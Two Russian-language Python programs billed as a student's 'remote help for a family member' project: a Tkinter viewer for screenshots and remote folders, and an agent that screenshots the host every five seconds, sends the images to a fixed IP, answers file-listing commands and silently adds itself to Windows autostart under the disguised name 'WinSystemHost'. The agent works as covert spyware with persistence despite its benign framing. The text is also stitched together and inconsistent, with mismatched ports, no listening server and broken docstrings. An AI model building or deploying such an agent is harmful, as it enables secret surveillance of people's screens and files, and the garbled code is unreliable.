"""
=============================================================================
КЛИЕНТСКАЯ ЧАСТЬ (Client) - у меня
=============================================================================
Образовательный проект: "Инструмент для удалённой помощи члену семьи"

Назначение: Программа устанавливается на мой ПК.
            Она подключается к серверу брата и получает скриншоты и файлы.

Автор: [Имя ученика]
Дата: 2026
Школа: [Название школы]
Предмет: Сетевые протоколы / Python

=============================================================================
ФУНКЦИИ:
- GUI на Tkinter для ввода IP-адреса сервера
- Подключение к серверу брата
- Отображение скриншотов в реальном времени
- Файловый браузер для просмотра папок брата
=============================================================================
"""

import socket       # Библиотека для работы с сетью (TCP/IP)
import tkinter      # Библиотека для графического интерфейса
from tkinter import ttk, messagebox
import threading    # Библиотека для многозадачности
import base64       # Библиотека для декодирования данных (изображения)
import io           # Библиотека для работы с потоками данных
import os           # Библиотека для работы с файловой системой
from PIL import Image, ImageTk  # Библиотека для работы с изображениями


# =============================================================================
# КОНФИГУРАЦИЯ КЛИЕНТА
# =============================================================================

# Порт сервера (должен совпадать с портом сервера)
SERVER_PORT = 5555


# =============================================================================
# КЛАСС ГЛАВНОГО ОКНА ПРИЛОЖЕНИЯ
# =============================================================================

class RemoteHelperClient:
    """
    Класс главного окна клиента.
    
    Содержит:
    - Окно подключения (ввод IP)
    - Окно просмотра экрана (Remote View)
    - Панель файлового браузера (File Explorer)
    """
    
    def __init__(self, root):
        """
        Конструктор класса - инициализирует окно и его компоненты.
        """
        self.root = root
        self.root.title("Удалённая помощь - Клиент")
        self.root.geometry("1000x700")
        
        # Переменные для хранения состояния
        self.server_socket = None  # Сокет для связи с сервером
        self.current_path = "C:\\"  # Текущая папка в файловом браузере
        self.running = True  # Флаг работы программы
        self.connected = False  # Флаг подключения
        
        # Создаём интерфейс
        self.create_connection_screen()
    
    
    def create_connection_screen(self):
        """
        Создаёт экран подключения (ввод IP-адреса сервера).
        """
        # Очищаем окно
        for widget in self.root.winfo_children():
            widget.destroy()
        
        # Рамка для подключения
        connection_frame = ttk.Frame(self.root, padding=50)
        connection_frame.pack(fill='both', expand=True)
        
        # Заголовок
        ttk.Label(
            connection_frame, 
            text="Подключение к серверу",
            font=("Arial", 18, "bold")
        ).pack(pady=20)
        
        # Поле для ввода IP-адреса
        ttk.Label(connection_frame, text="IP-адрес сервера:").pack(pady=5)
        self.ip_entry = ttk.Entry(connection_frame, font=("Arial", 14), width=20)
        self.ip_entry.insert(0, "192.168.31.11")  # IP по умолчанию
        self.ip_entry.pack(pady=10)
        
        # Кнопка подключения
        connect_button = ttk.Button(
            connection_frame, 
            text="Подключиться", 
            command=self.connect_to_server
        )
        connect_button.pack(pady=20)
        
        # Статус подключения
        self.status_label = ttk.Label(
            connection_frame, 
            text="Введите IP-адрес сервера и нажмите 'Подключиться'",
            font=("Arial", 10),
            foreground="gray"
        )
        self.status_label.pack(pady=10)
    
    
    def create_main_interface(self):
        """
        Создаёт основной интерфейс после подключения.
        """
        # Очищаем окно
        for widget in self.root.winfo_children():
            widget.destroy()
        
        # Создаём меню (вкладки)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Вкладка 1: Remote View (просмотр экрана)
        self.view_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.view_frame, text="📺 Remote View")
        self.create_remote_view_tab()
        
        # Вкладка 2: File Explorer (файловый браузер)
        self.explorer_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.explorer_frame, text="📁 File Explorer")
        self.create_file_explorer_tab()
    
    
    def create_remote_view_tab(self):
        """
        Создаёт вкладку Remote View (просмотр экрана).
        """
        # Метка статуса
        self.view_status_label = ttk.Label(
            self.view_frame, 
            text="Подключено. Ожидание скриншотов...",
            font=("Arial", 12)
        )
        self.view_status_label.pack(pady=10)
        
        # Рамка для изображения
        self.image_frame = ttk.Frame(self.view_frame, borderwidth=2, relief="solid")
        self.image_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Метка для отображения изображения
        self.image_label = ttk.Label(
            self.image_frame,
            text="Здесь будет отображаться экран сервера",
            font=("Arial", 14),
            foreground="gray"
        )
        self.image_label.pack(fill='both', expand=True)
        
        # Переменная для хранения изображения
        self.photo_image = None
    
    
    def create_file_explorer_tab(self):
        """
        Создаёт вкладку File Explorer (файловый браузер).
        """
        # Панель навигации
        nav_frame = ttk.Frame(self.explorer_frame)
        nav_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Label(nav_frame, text="Текущий путь:").pack(side='left', padx=5)
        
        self.path_label = ttk.Label(nav_frame, text=self.current_path, font=("Courier", 10))
        self.path_label.pack(side='left', padx=5)
        
        self.up_button = ttk.Button(nav_frame, text="⬆ Вверх", command=self.go_up)
        self.up_button.pack(side='left', padx=5)
        
        self.home_button = ttk.Button(nav_frame, text="🏠 Домой", command=self.go_home)
        self.home_button.pack(side='left', padx=5)
        
        self.refresh_button = ttk.Button(nav_frame, text="🔄 Обновить", command=self.refresh_files)
        self.refresh_button.pack(side='left', padx=5)
        
        # Список файлов
        list_frame = ttk.Frame(self.explorer_frame)
        list_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side='right', fill='y')
        
        self.file_list = tkinter.Listbox(
            list_frame, 
            yscrollcommand=scrollbar.set,
            font=("Courier", 10),
            selectmode='single'
        )
        self.file_list.pack(side='left', fill='both', expand=True)
        scrollbar.config(command=self.file_list.yview)
        
        self.file_list.bind('<Double-Button-1>', self.on_file_double_click)
        
        open_button = ttk.Button(self.explorer_frame, text="Открыть", command=self.open_selected)
        open_button.pack(pady=5)
    
    
    # ============================================================================
    # ФУНКЦИИ ПОДКЛЮЧЕНИЯ
    # ============================================================================
    
    def connect_to_server(self):
        """
        Подключается к серверу по введённому IP-адресу.
        """
        server_ip = self.ip_entry.get().strip()
        
        if not server_ip:
            messagebox.showerror("Ошибка", "Введите IP-адрес сервера")
            return
        
        self.status_label.config(text="Подключение...", foreground="orange")
        self.root.update()
        
        try:
            # Создаём сокет
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Подключаемся к серверу
            self.server_socket.connect((server_ip, SERVER_PORT))
            
            # Ждём подтверждение от сервера
            response = self.server_socket.recv(1024).decode('utf-8')
            
            if response == "CONNECTED":
                self.connected = True
                self.status_label.config(text="Подключено!", foreground="green")
                messagebox.showinfo("Успех", "Подключение установлено!")
                
                # Создаём основной интерфейс
                self.create_main_interface()
                
                # Запускаем потоки
                self.start_receiving()
                
            elif response.startswith("BLOCKED"):
                messagebox.showerror("Ошибка", "Доступ заблокирован. Ваш IP не в белом списке.")
                self.server_socket.close()
                self.status_label.config(text="Отклонено сервером", foreground="red")
            else:
                messagebox.showerror("Ошибка", f"Неизредный ответ: {response}")
                self.server_socket.close()
                
        except ConnectionRefusedError:
            messagebox.showerror("Ошибка", "Сервер недоступен. Проверьте IP и порт.")
            self.status_label.config(text="Ошибка подключения", foreground="red")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Ошибка подключения: {e}")
            self.status_label.config(text="Ошибка", foreground="red")
    
    
    def start_receiving(self):
        """
        Запускает потоки приёма данных.
        """
        # Поток приёма скриншотов
        self.screenshot_thread = threading.Thread(target=self.receive_screenshots, daemon=True)
        self.screenshot_thread.start()
        
        # Поток обработки команд
        self.command_thread = threading.Thread(target=self.handle_server_commands, daemon=True)
        self.command_thread.start()
    
    
    def receive_screenshots(self):
        """
        Принимает скриншоты от сервера и отображает их.
        """
        while self.running and self.connected and self.server_socket:
            try:
                # Получаем размер данных
                size_data = self.server_socket.recv(4)
                
                if not size_data:
                    break
                
                size = int.from_bytes(size_data, byteorder='big')
                
                # Получаем данные изображения
                data = b''
                while len(data) < size:
                    chunk = self.server_socket.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                
                # Декодируем и отображаем
                image_data = base64.b64decode(data)
                buffer = io.BytesIO(image_data)
                img = Image.open(buffer)
                
                # Масштабируем если нужно
                try:
                    width = self.image_frame.winfo_width()
                    height = self.image_frame.winfo_height()
                    if width > 1 and height > 1:
                        img_width, img_height = img.size
                        ratio = min(width / img_width, height / img_height)
                        new_size = (int(img_width * ratio), int(img_height * ratio))
                        img = img.resize(new_size, Image.Resampling.LANCZOS)
                except:
                    pass
                
                self.photo_image = ImageTk.PhotoImage(img)
                self.root.after(0, self.update_image_display)
                
            except Exception as e:
                print(f"[Скриншот] Ошибка: {e}")
                break
        
        print("[Клиент] Поток скриншотов завершён")
    
    
    def update_image_display(self):
        """
        Обновляет отображаемое изображение.
        """
        if self.photo_image:
            self.image_label.config(image=self.photo_image, text="")
    
    
    def handle_server_commands(self):
        """
        Обрабатывает команды файлового браузера.
        """
        while self.running and self.connected and self.server_socket:
            # Команды обрабатываются синхронно по запросу пользователя
            pass
    
    
    # ============================================================================
    # ФУНКЦИИ ФАЙЛОВОГО БРАУЗЕРА
    # ============================================================================
    
    def send_list_command(self, path):
        """
        Отправляет команду LIST серверу.
        """
        if not self.server_socket:
            messagebox.showwarning("Предупреждение", "Нет подключения")
            return
        
        try:
            command = f"LIST:{path}"
            self.server_socket.sendall(command.encode('utf-8'))
            
            self.server_socket.settimeout(10)
            response = self.server_socket.recv(65536).decode('utf-8')
            
            if response.startswith("ERROR:"):
                messagebox.showerror("Ошибка", response[6:])
                return
            
            self.file_list.delete(0, tkinter.END)
            
            lines = response.split('\n')
            for line in lines:
                if line:
                    parts = line.split('|')
                    name = parts[0]
                    file_type = parts[1] if len(parts) > 1 else "FILE"
                    
                    if file_type == "DIR":
                        self.file_list.insert(tkinter.END, f"📁 {name}")
                    else:
                        self.file_list.insert(tkinter.END, f"📄 {name}")
            
            self.current_path = path
            self.path_label.config(text=path)
            
        except socket.timeout:
            messagebox.showwarning("Таймаут", "Сервер не отвечает")
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))
    
    
    def go_up(self):
        """
        Переходит в родительскую папку.
        """
        parent = os.path.dirname(self.current_path)
        if parent:
            self.send_list_command(parent)
    
    
    def go_home(self):
        """
        Переходит в корневую папку.
        """
        self.send_list_command("C:\\")
    
    
    def refresh_files(self):
        """
        Обновляет список файлов.
        """
        self.send_list_command(self.current_path)
    
    
    def on_file_double_click(self, event):
        """
        Обрабатывает двойной клик по файлу/папке.
        """
        selection = self.file_list.curselection()
        if selection:
            item = self.file_list.get(selection[0])
            name = item[2:] if item.startswith("📁 ") or item.startswith("📄 ") else item
            
            new_path = os.path.join(self.current_path, name)
            
            if item.startswith("📁 "):
                self.send_list_command(new_path)
            else:
                self.show_file_info(new_path)
    
    
    def open_selected(self):
        """
        Открывает выбранный файл/папку.
        """
        selection = self.file_list.curselection()
        if selection:
            self.on_file_double_click(None)
    
    
    def show_file_info(self, path):
        """
        Показывает информацию о файле.
        """
        if not self.server_socket:
            return
        
        try:
            command = f"INFO:{path}"
            self.server_socket.sendall(command.encode('utf-8'))
            
            self.server_socket.settimeout(5)
            response = self.server_socket.recv(4096).decode('utf-8')
            
            messagebox.showinfo("Информация о файле", response)
            
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))


# =============================================================================
# ТОЧКА ВХОДА
# =============================================================================

def main():
    """
    Главная функция - создаёт и запускает приложение.
    """
    root = tkinter.Tk()
    app = RemoteHelperClient(root)
    
    def on_closing():
        app.running = False
        if app.server_socket:
            app.server_socket.close()
        root.destroy()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()

=============================================================================
"""

import socket       # Библиотека для работы с сетью (TCP/IP)
import pyautogui    # Библиотека для создания скриншотов
import os           # Библиотека для работы с файловой системой
import sys          # Библиотека для системных функций
import time         # Библиотека для работы со временем
import threading    # Библиотека для многозадачности
import shutil       # Библиотека для работы с файлами
import base64       # Библиотека для кодирования данных (изображения)
import io           # Библиотека для работы с потоками данных
import winreg       # Библиотека для работы с реестром Windows
from PIL import Image  # Библиотека для работы с изображениями (Pillow)


# =============================================================================
# КОНФИГУРАЦИЯ ПРОГРАММЫ
# =============================================================================

# IP-адрес сервера (нужно заменить на реальный IP вашего ПК)
# Чтобы узнать свой IP: в командной строке введите "ipconfig"
SERVER_IP = "192.168.31.11"  # Пример IP-адреса - ИЗМЕНИТЕ НА СВОЙ!

# Порт сервера (номер порта, который слушает сервер)
SERVER_PORT = 9999

# Интервал отправки скриншотов в секундах
SCREENSHOT_INTERVAL = 5


# =============================================================================
# ФУНКЦИЯ 1: ОТПРАВКА СКРИНШОТОВ (Remote View)
# =============================================================================
"""
Принцип работы Remote View:
1. Каждые 5 секунд программа делает скриншот экрана
2. Скриншот сжимается (уменьшается качество) для быстрой передачи
3. Изображение кодируется в текстовый формат (base64)
4. Данные отправляются через сокет на сервер

Это похоже на то, как работает видеосвязь, но с меньшей частотой кадров.
"""

def send_screenshots(sock):
    """
    Функция отправляет скриншоты на сервер каждые N секунд.
    
    Параметры:
        sock - объект сокета для отправки данных
    
    Как это работает (пошагово):
    1. Бесконечный цикл (while True) - работает постоянно
    2. time.sleep(SCREENSHOT_INTERVAL) - ждём 5 секунд
    3. pyautogui.screenshot() - делаем снимок экрана
    4. Сохраняем в буфер (BytesIO) в формате JPEG
    5. Кодируем в base64 для передачи
    6. Отправляем размер данных (4 байта)
    7. Отправляем сами данные (изображение)
    """
    print("[Remote View] Модуль скриншотов запущен")
    
    while True:
        try:
            # Шаг 1: Ждём указанное время перед следующим скриншотом
            time.sleep(SCREENSHOT_INTERVAL)
            
            # Шаг 2: Делаем скриншот всего экрана
            # pyautogui.screenshot() возвращает объект изображения PIL
            screenshot = pyautogui.screenshot()
            
            # Шаг 3: Сжимаем изображение для быстрой передачи
            # Используем буфер в памяти (не сохраняем на диск)
            buffer = io.BytesIO()
            
            # Сохраняем как JPEG с качеством 50% (меньше размер файла)
            # Это важно для быстрой передачи по сети
            screenshot.save(buffer, format='JPEG', quality=50)
            
            # Получаем данные изображения из буфера
            image_data = buffer.getvalue()
            
            # Шаг 4: Кодируем в base64 (преобразуем в текстовый формат)
            # Base64 преобразует двоичные данные в текст, безопасный для передачи
            encoded_data = base64.b64encode(image_data)
            
            # Шаг 5: Отправляем данные на сервер
            # Сначала отправляем размер данных (4 байта, упакованные в 4 байта)
            # Это нужно, чтобы сервер знал, сколько данных ожидать
            size = len(encoded_data)
            sock.sendall(size.to_bytes(4, byteorder='big'))
            
            # Затем отправляем сами данные
            sock.sendall(encoded_data)
            
            print(f"[Remote View] Скриншот отправлен: {size} байт")
            
        except Exception as e:
            # Если произошла ошибка, выводим сообщение и продолжаем работу
            print(f"[Remote View] Ошибка: {e}")
            break


# =============================================================================
# ФУНКЦИЯ 2: ОБРАБОТКА КОМАНД ОТ СЕРВЕРА (File Explorer)
# =============================================================================
"""
Принцип работы File Explorer:
1. Клиент получает команду от сервера (например, "LIST:C:\\Users")
2. Клиент выполняет команду (os.listdir - получить список файлов)
3. Результат отправляется обратно серверу

Команды могут быть:
- LIST:<путь> - получить список файлов в папке
- INFO:<путь> - получить информацию о файле/папке
"""

def handle_server_commands(sock):
    """
    Функция обрабатывает команды, поступающие от сервера.
    
    Команды от сервера:
    - LIST:<путь> - получить список файлов и папок
    - INFO:<путь> - получить детальную информацию
    
    Как это работает:
    1. Сервер отправляет текстовую команду (например "LIST:C:\\Users")
    2. Мы разбираем команду (разделяем по символу :)
    3. Выполняем соответствующее действие
    4. Отправляем результат обратно
    """
    print("[File Explorer] Модуль файлового браузера запущен")
    
    while True:
        try:
            # Шаг 1: Получаем команду от сервера
            # Команда - это текст, ограниченный символом новой строки
            command = sock.recv(4096).decode('utf-8').strip()
            
            if not command:
                # Если команда пустая, выходим из цикла
                break
            
            print(f"[File Explorer] Получена команда: {command}")
            
            # Шаг 2: Разбираем команду
            # Команда имеет формат "КОМАНДА:ПАРАМЕТР"
            if ':' in command:
                cmd_type, cmd_path = command.split(':', 1)
            else:
                cmd_type = command
                cmd_path = ""
            
            # Шаг 3: Выполняем команду
            if cmd_type == "LIST":
                # Команда LIST: получить список файлов в папке
                try:
                    # os.listdir() возвращает список имён файлов и папок
                    files = os.listdir(cmd_path)
                    
                    # Формируем результат в виде текста
                    # Каждая строка: "имя|тип" где тип = FILE или DIR
                    result = []
                    for f in files:
                        full_path = os.path.join(cmd_path, f)
                        if os.path.isdir(full_path):
                            result.append(f"{f}|DIR")  # Папка
                        else:
                            result.append(f"{f}|FILE")  # Файл
                    
                    # Отправляем результат серверу
                    response = "\n".join(result)
                    sock.sendall(response.encode('utf-8'))
                    print(f"[File Explorer] Отправлено {len(result)} элементов")
                    
                except Exception as e:
                    # Если ошибка, отправляем сообщение об ошибке
                    sock.sendall(f"ERROR: {str(e)}".encode('utf-8'))
                    print(f"[File Explorer] Ошибка: {e}")
            
            elif cmd_type == "INFO":
                # Команда INFO: получить информацию о файле/папке
                try:
                    if os.path.isfile(cmd_path):
                        # Если это файл - показываем размер
                        size = os.path.getsize(cmd_path)
                        info = f"FILE|{size} bytes"
                    elif os.path.isdir(cmd_path):
                        # Если это папка - показываем количество файлов
                        count = len(os.listdir(cmd_path))
                        info = f"DIR|{count} items"
                    else:
                        info = "NOT FOUND"
                    
                    sock.sendall(info.encode('utf-8'))
                    
                except Exception as e:
                    sock.sendall(f"ERROR: {str(e)}".encode('utf-8'))
            
            else:
                # Неизвестная команда
                sock.sendall(b"UNKNOWN COMMAND")
                
        except Exception as e:
            print(f"[File Explorer] Ошибка: {e}")
            break


# =============================================================================
# ФУНКЦИЯ 3: АВТОЗАПУСК ЧЕРЕЗ РЕЕСТР (Auto-Start)
# =============================================================================
"""
Принцип работы Auto-Start через реестр:
1. При запуске программа проверяет ключ реестра HKCU\Software\Microsoft\Windows\CurrentVersion\Run
2. Если ключа нет - добавляет путь к программе в этот ключ
3. При каждом старте Windows программа запускается автоматически

Реестр Windows - это база данных настроек системы.
HKCU - это ветка реестра текущего пользователя (HKEY_CURRENT_USER)
"""

def add_to_startup():
    """
    Функция добавляет программу в автозапуск через реестр Windows.
    
    Использует библиотеку winreg для работы с системным реестром.
    Определяет, запущен ли скрипт как .py или как .exe.
    
    Ключ реестра: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    """
    try:
        # Имя ключа в реестре (произвольное название)
        REG_KEY_NAME = "WinSystemHost"
        
        # Определяем путь к запущенному файлу
        if getattr(sys, 'frozen', False):
            # Скрипт запущен как скомпилированный .exe
            # sys.executable содержит путь к exe-файлу
            exe_path = sys.executable
            print(f"[Auto-Start] Определён как .exe: {exe_path}")
        else:
            # Скрипт запущен как .py файл
            # sys.argv[0] содержит путь к скрипту
            exe_path = sys.executable + " " + sys.argv[0]
            print(f"[Auto-Start] Определён как .py: {exe_path}")
        
        # Открываем ключ реестра для чтения
        # winreg.OpenKey(ключ, подключь, права_доступа)
        # HKEY_CURRENT_USER - ветка реестра текущего пользователя
        # 0 - открыть подключ (не создавать)
        # KEY_WRITE | KEY_READ - права на запись и чтение
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ | winreg.KEY_WRITE
        )
        
        try:
            # Пробуем получить значение ключа
            # Если ключ существует - получим путь, если нет - исключение
            existing_value = winreg.QueryValueEx(key, REG_KEY_NAME)
            print(f"[Auto-Start] Уже в автозапуске: {existing_value[0]}")
            
        except FileNotFoundError:
            # Ключ не существует - добавляем новый
            # winreg.SetValueEx(ключ, имя_значения, тип, данные)
            # REG_SZ = строка (текстовый тип)
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, exe_path)
            print(f"[Auto-Start] Добавлено в автозапуск: {exe_path}")
            
        finally:
            # Закрываем ключ реестра (важно!)
            winreg.CloseKey(key)
            
    except PermissionError:
        print("[Auto-Start] Ошибка: нет прав для записи в реестр")
        print("           Запустите программу от имени администратора")
    except Exception as e:
        print(f"[Auto-Start] Ошибка: {e}")


# =============================================================================
# ОСНОВНАЯ ФУНКЦИЯ: ПОДКЛЮЧЕНИЕ К СЕРВЕРУ
# =============================================================================

def connect_to_server():
    """
    Главная функция, которая соединяет клиента с сервером.
    
    Процесс подключения (по TCP):
    1. Создаём объект сокета (socket.AF_INET - IPv4, socket.SOCK_STREAM - TCP)
    2. Подключаемся к серверу (connect)
    3. Запускаем два параллельных процесса (потока):
       - Отправка скриншотов
       - Обработка команд файлового браузера
    
    TCP vs UDP:
    - TCP (socket.SOCK_STREAM) - надёжная доставка, проверка ошибок
    - UDP (socket.SOCK_DGRAM) - быстрая, но без гарантии доставки
    Для скриншотов нам важна надёжность, поэтому используем TCP.
    """
    print("=" * 60)
    print("  КЛИЕНТ УДАЛЁННОЙ ПОМОЩИ")
    print("  Подключение к серверу...")
    print("=" * 60)
    
    # Настраиваем автозапуск через реестр
    add_to_startup()
    
    while True:
        try:
            # Шаг 1: Создаём сокет
            # socket.AF_INET - используем IPv4 адресацию
            # socket.SOCK_STREAM - используем TCP протокол (надёжная передача)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Шаг 2: Подключаемся к серверу
            # Указываем IP-адрес сервера и номер порта
            print(f"[Соединение] Подключение к {SERVER_IP}:{SERVER_PORT}...")
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print("[Соединение] Успешно подключено!")
            
            # Шаг 3: Запускаем параллельные процессы (потоки)
            # threading.Thread создаёт новый поток выполнения
            # target - функция, которую нужно выполнить в потоке
            # daemon=True - поток закроется при закрытии основной программы
            
            # Поток 1: Отправка скриншотов
            screenshot_thread = threading.Thread(
                target=send_screenshots, 
                args=(client_socket,),
                daemon=True
            )
            screenshot_thread.start()
            
            # Поток 2: Обработка команд файлового браузера
            explorer_thread = threading.Thread(
                target=handle_server_commands, 
                args=(client_socket,),
                daemon=True
            )
            explorer_thread.start()
            
            # Шаг 4: Ждём, пока потоки работают
            # join() заставляет главный поток ждать завершения указанного потока
            screenshot_thread.join()
            explorer_thread.join()
            
        except ConnectionRefusedError:
            # Сервер не отвечает - пробуем снова через 5 секунд
            print("[Ошибка] Сервер недоступен. Повторная попытка через 5 сек...")
            time.sleep(5)
            
        except Exception as e:
            # Любая другая ошибка
            print(f"[Ошибка] {e}")
            print("Переподключение через 5 секунд...")
            time.sleep(5)


# =============================================================================
# ТОЧКА ВХОДА В ПРОГРАММУ
# =============================================================================

if __name__ == "__main__":
    """
    Точка входа - здесь начинается выполнение программы.
    
    when __name__ == "__main__":
    Это условие проверяет, что файл запущен напрямую, а не импортирован.
    Это стандартная практика в Python.
    """
    try:
        # Запускаем основную функцию подключения
        connect_to_server()
    except KeyboardInterrupt:
        # Если пользователь нажал Ctrl+C - выходим
        print("\n[Выход] Программа завершена пользователем")
    except Exception as e:
        # Любая необработанная ошибка
        print(f"[Критическая ошибка] {e}")